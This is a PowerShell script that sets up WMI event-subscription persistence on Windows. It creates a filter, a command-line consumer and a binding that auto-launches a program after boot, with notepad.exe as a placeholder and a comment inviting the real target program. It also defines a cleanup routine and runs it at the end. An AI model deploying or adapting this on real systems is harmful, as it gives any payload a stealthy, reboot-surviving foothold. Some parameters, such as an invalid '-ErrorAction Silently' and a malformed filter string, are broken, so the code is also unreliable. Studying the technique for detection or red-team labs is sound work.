# Create a WMI event subscription for persistence

# Define the filter parameters
$filterParams = @{
    Name            = "MyFilter"
    EventNamespace  = "root\cimv2"
    QueryLanguage   = "WQL"
    Query           = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 500"
}

# Create the event filter
try {
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $filterParams -ErrorAction Stop
} catch {
    Write-Error "Failed to create WMI Event Filter: $($_.Exception.Message)"
    # Exit the script if the filter cannot be created.  This is important
    Exit
}

# Define the consumer parameters
$consumerParams = @{
    Name            = "MyConsumer"
    ExecutablePath  = "notepad.exe" #  <---  Change this to the actual path of the program you want to run
}

# Create the command-line event consumer
try {
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $consumerParams -ErrorAction Stop
} catch {
    Write-Error "Failed to create WMI CommandLineEventConsumer: $($_.Exception.Message)"
     # Clean up the filter if the consumer fails to create.
    if ($filter) {
        Remove-WmiObject -InputObject $filter -ErrorAction Silently
    }
    Exit
}

# Create the binding between the filter and consumer
$bindingParams = @{
    Filter   = $filter
    Consumer = $consumer
}

try {
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $bindingParams -ErrorAction Stop
    Write-Host "WMI Event Subscription successfully created." -ForegroundColor Green
} catch {
    Write-Error "Failed to create WMI FilterToConsumerBinding: $($_.Exception.Message)"
    # Clean up the filter and consumer if the binding fails.
    if ($filter) {
        Remove-WmiObject -InputObject $filter  -ErrorAction Silently
    }
    if ($consumer) {
        Remove-WmiObject -InputObject $consumer -ErrorAction Silently
    }
    Exit
}

# Cleanup (optional - can be run after testing)
function Cleanup-WmiSubscription {
    param()

    # Use try...catch for each removal, and check if the object exists before attempting removal.
    try {
        $binding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = '__EventFilter.Name=""MyFilter""" -ErrorAction Stop
        if ($binding) {
            $binding | Remove-WmiObject -ErrorAction Stop
            Write-Host "Binding removed."
        }
    } catch {
        Write-Warning "Failed to remove binding: $($_.Exception.Message)"
    }

    try {
        $consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='MyConsumer'" -ErrorAction Stop
        if ($consumer) {
            $consumer | Remove-WmiObject -ErrorAction Stop
            Write-Host "Consumer removed."
        }
    } catch {
        Write-Warning "Failed to remove consumer: $($_.Exception.Message)"
    }

    try {
        $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='MyFilter'" -ErrorAction Stop
        if ($filter) {
            $filter | Remove-WmiObject -ErrorAction Stop
            Write-Host "Filter removed."
        }
    } catch {
        Write-Warning "Failed to remove filter: $($_.Exception.Message)"
    }
}

# Example of calling the cleanup function:
Cleanup-WmiSubscription
